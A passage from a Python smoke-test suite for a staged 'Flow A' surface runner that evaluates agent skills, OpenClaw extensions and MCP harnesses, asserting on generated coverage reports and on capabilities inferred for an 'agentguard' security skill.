            "command": ["missing-extension-runtime-command"],
            "cwd": ".",
            "timeoutSeconds": 15,
        }
        testing["mcpHarness"] = {
            "command": ["missing-mcp-command"],
            "cwd": ".",
            "timeoutSeconds": 15,
        }
        write_text(testing_path, json.dumps(testing, ensure_ascii=False, indent=2) + "\n")

        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-session", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-session",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )

        runner_proc = None
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_proc = proc

        assert runner_proc is not None, "runner process missing"
        runner_output = parse_kv_output(runner_proc.stdout)
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "explicit harness failed to start", "extension startup failure recorded")
        assert_contains(skill_results, "mcp harness failed to start", "mcp startup failure recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        kind_status = {
            str(surface.get("kind")): str(surface.get("status"))
            for surface in coverage.get("surfaces", [])
        }
        assert_equal(kind_status.get("openclaw-extension"), "blocked", "extension misconfig status")
        assert_equal(kind_status.get("mcp"), "blocked", "mcp misconfig status")
        blocked_extension = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "openclaw-extension"
        )
        assert_equal(blocked_extension.get("executedCaseCount"), 0, "blocked extension executed case count")
        print("  [PASS] test_surface_runner_misconfigured_harnesses")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_live_probe_without_runtime_harness() -> None:
    if not find_runnable_bash():
        print("  [SKIP] test_surface_runner_live_probe_without_runtime_harness: runnable bash unavailable")
        return

    temp_root = make_temp_root("flowa-runner-live-probe-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        testing_path = skill_dir / "testing.json"
        testing = json.loads(read_text(testing_path))
        testing.pop("openclawExtensionRuntimeHarness", None)
        testing.pop("openclawExtensionHarness", None)
        write_text(testing_path, json.dumps(testing, ensure_ascii=False, indent=2) + "\n")
        write_text(
            skill_dir / "hooks" / "hooks.json",
            json.dumps(
                {
                    "hooks": {
                        "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo ok"}]}],
                        "PostToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo ok"}]}],
                    }
                },
                ensure_ascii=False,
                indent=2,
            )
            + "\n",
        )

        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-live-probe", extra_dirs=("workspace/skills",))
        mock_openclaw = build_mock_openclaw(temp_root / "mock-openclaw")
        env = os.environ.copy()
        env["PATH"] = str(mock_openclaw.parent) + os.pathsep + env.get("PATH", "")

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-live-probe",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                env=env,
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "runtime-probed=true", "live probe note recorded")
        assert_contains(skill_results, "runtime-transport=openclaw-live", "live probe transport recorded")
        assert_contains(skill_results, "registered-hooks=2", "live probe hook count recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        extension_entry = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "openclaw-extension"
        )
        assert_equal(extension_entry.get("status"), "incomplete", "extension live probe status")
        assert_equal(extension_entry.get("executionLevel"), "live", "extension live probe level")
        print("  [PASS] test_surface_runner_live_probe_without_runtime_harness")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_extension_module_probe_without_openclaw_cli() -> None:
    temp_root = make_temp_root("flowa-runner-extension-module-probe-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        testing_path = skill_dir / "testing.json"
        testing = json.loads(read_text(testing_path))
        testing.pop("openclawExtensionRuntimeHarness", None)
        testing.pop("openclawExtensionHarness", None)
        write_text(testing_path, json.dumps(testing, ensure_ascii=False, indent=2) + "\n")
        write_text(
            skill_dir / "hooks" / "hooks.json",
            json.dumps(
                {
                    "hooks": {
                        "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo ok"}]}],
                        "PostToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo ok"}]}],
                    }
                },
                ensure_ascii=False,
                indent=2,
            )
            + "\n",
        )

        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-extension-module-probe", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-extension-module-probe",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        env = os.environ.copy()
        env["PATH"] = env.get("PATH", "")
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                env=env,
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "runtime-fallback=module-probe", "module probe fallback recorded")
        assert_contains(skill_results, "runtime-transport=openclaw-module-probe", "module probe transport recorded")
        assert_contains(skill_results, "registered-hooks=2", "module probe hook count recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        extension_entry = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "openclaw-extension"
        )
        assert_equal(extension_entry.get("status"), "incomplete", "extension module probe status")
        assert_equal(extension_entry.get("executionLevel"), "shim-live", "extension module probe level")
        print("  [PASS] test_surface_runner_extension_module_probe_without_openclaw_cli")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_case_harness_executes_all_skill_cases() -> None:
    temp_root = make_temp_root("flowa-runner-case-harness-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        testing_path = skill_dir / "testing.json"
        testing = json.loads(read_text(testing_path))
        testing["caseExecutionHarnesses"] = {
            "skill": {
                "command": [sys.executable, "scripts/case-harness.py"],
                "cwd": ".",
                "timeoutSeconds": 15,
            }
        }
        write_text(testing_path, json.dumps(testing, ensure_ascii=False, indent=2) + "\n")

        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-case-harness", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--case-plan",
                str(reports_dir / "CASE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-case-harness",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "executed-case-ids", "executed case ids recorded")
        assert_contains(skill_results, "case-coverage=", "case coverage note recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        skill_surface = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "skill"
        )
        assert_equal(skill_surface.get("status"), "passed", "skill case harness status")
        assert "surface-smoke-only=true" not in str(skill_surface.get("notes", "")), "skill case harness should avoid smoke-only downgrade"
        assert_equal(
            skill_surface.get("executedCaseCount"),
            skill_surface.get("requiredCaseCount"),
            "skill case harness executed all required cases",
        )
        pending_rows = [
            row for row in skill_surface.get("caseResults", []) if str(row.get("status")) == "pending"
        ]
        assert_equal(len(pending_rows), 0, "skill case harness pending rows")
        print("  [PASS] test_surface_runner_case_harness_executes_all_skill_cases")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_infers_agentguard_cases_without_harness() -> None:
    temp_root = make_temp_root("flowa-runner-inferred-agentguard-")
    try:
        skill_dir = build_inferred_agentguard_fixture(temp_root)
        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-inferred-agentguard", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--case-plan",
                str(reports_dir / "CASE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-inferred-agentguard",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "inferred-provider=agentguard", "agentguard provider recorded")
        assert_contains(skill_results, "inferred-capability=scan", "scan capability recorded")
        assert_contains(skill_results, "inferred-capability=action", "action capability recorded")
        assert_contains(skill_results, "inferred-capability=trust", "trust capability recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        skill_surface = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "skill"
        )
        assert_equal(skill_surface.get("status"), "passed", "inferred agentguard skill status")
        assert_equal(
            skill_surface.get("executedCaseCount"),
            skill_surface.get("requiredCaseCount"),
            "inferred agentguard executed all required cases",
        )
        pending_rows = [
            row for row in skill_surface.get("caseResults", []) if str(row.get("status")) == "pending"
        ]
        assert_equal(len(pending_rows), 0, "inferred agentguard pending rows")
        print("  [PASS] test_surface_runner_infers_agentguard_cases_without_harness")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_infers_agentguard_runtime_cases_without_harness() -> None:
    temp_root = make_temp_root("flowa-runner-inferred-agentguard-runtime-")
    try:
        skill_dir = build_inferred_agentguard_fixture(temp_root, include_runtime_cases=True)
        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-inferred-agentguard-runtime", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--case-plan",
                str(reports_dir / "CASE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-inferred-agentguard-runtime",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "inferred-capability=checkup", "checkup capability recorded")
        assert_contains(skill_results, "visual-report-generated=true", "checkup report probe recorded")
        assert_contains(skill_results, "inferred-capability=patrol", "patrol capability recorded")
        assert_contains(skill_results, "auto-scan-scanned=2", "patrol auto-scan count recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        skill_surface = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "skill"
        )
        case_plan = json.loads(read_text(reports_dir / "CASE-EXECUTION-PLAN.json"))
        case_id_by_title = {
            str(item.get("title")): str(item.get("caseId"))
            for item in case_plan.get("cases", [])
            if str(item.get("surfaceId")) == str(skill_surface.get("surfaceId"))
        }
        case_status_by_id = {
            str(row.get("caseId")): str(row.get("status"))
            for row in skill_surface.get("caseResults", [])
        }

        def find_case_status(fragment: str) -> str | None:
            for title, case_id in case_id_by_title.items():
                if fragment in title:
                    return case_status_by_id.get(case_id)
            return None

        assert_equal(skill_surface.get("status"), "passed", "runtime-heavy inferred agentguard skill status")
        assert_equal(
            skill_surface.get("executedCaseCount"),
            skill_surface.get("requiredCaseCount"),
            "runtime-heavy inferred agentguard executed all required cases",
        )
        assert_equal(
            find_case_status("Skill/Plugin Integrity"),
            "passed",
            "patrol integrity check auto-passes",
        )
        assert_equal(
            find_case_status("Audit Log Analysis"),
            "passed",
            "patrol audit check auto-passes",
        )
        pending_rows = [
            row for row in skill_surface.get("caseResults", []) if str(row.get("status")) == "pending"
        ]
        assert_equal(len(pending_rows), 0, "runtime-heavy inferred agentguard pending rows")
        print("  [PASS] test_surface_runner_infers_agentguard_runtime_cases_without_harness")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_infers_agentguard_patrol_partial_fallback() -> None:
    temp_root = make_temp_root("flowa-runner-inferred-agentguard-patrol-fallback-")
    try:
        skill_dir = build_inferred_agentguard_fixture(temp_root, include_runtime_cases=True)
        write_text(skill_dir / "scripts" / "auto-scan.js", "#!/usr/bin/env node\nprocess.exit(0)\n")
        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-inferred-agentguard-patrol-fallback", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--case-plan",
                str(reports_dir / "CASE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-inferred-agentguard-patrol-fallback",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
        )

        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "partial-fallback-used=true", "patrol fallback note recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        skill_surface = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "skill"
        )
        assert_equal(skill_surface.get("status"), "passed", "patrol fallback keeps skill surface executable")
        pending_rows = [
            row for row in skill_surface.get("caseResults", []) if str(row.get("status")) == "pending"
        ]
        assert_equal(len(pending_rows), 0, "patrol fallback inferred agentguard pending rows")
        print("  [PASS] test_surface_runner_infers_agentguard_patrol_partial_fallback")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")

    passed = 0
    failed = 0
    print("Flow A Surface Runner Smoke Tests")
    print("=" * 40)
    try:
        test_surface_runner()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner: {exc}")
        failed += 1
    try:
        test_surface_runner_accepts_line_delimited_mcp()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_accepts_line_delimited_mcp: {exc}")
        failed += 1
    try:
        test_surface_runner_misconfigured_harnesses()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_misconfigured_harnesses: {exc}")
        failed += 1
    try:
        test_surface_runner_live_probe_without_runtime_harness()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_live_probe_without_runtime_harness: {exc}")
        failed += 1
    try:
        test_surface_runner_extension_module_probe_without_openclaw_cli()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_extension_module_probe_without_openclaw_cli: {exc}")
        failed += 1
    try:
        test_surface_runner_case_harness_executes_all_skill_cases()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_case_harness_executes_all_skill_cases: {exc}")
        failed += 1
    try:
        test_surface_runner_infers_agentguard_cases_without_harness()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_infers_agentguard_cases_without_harness: {exc}")
        failed += 1
    try:
        test_surface_runner_infers_agentguard_runtime_cases_without_harness()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_infers_agentguard_runtime_cases_without_harness: {exc}")
        failed += 1
    try:
        test_surface_runner_infers_agentguard_patrol_partial_fallback()
        passed += 1
    except AssertionError as exc:
        print(f"  [FAIL] test_surface_runner_infers_agentguard_patrol_partial_fallback: {exc}")
        failed += 1
    print("=" * 40)
    print(f"{passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
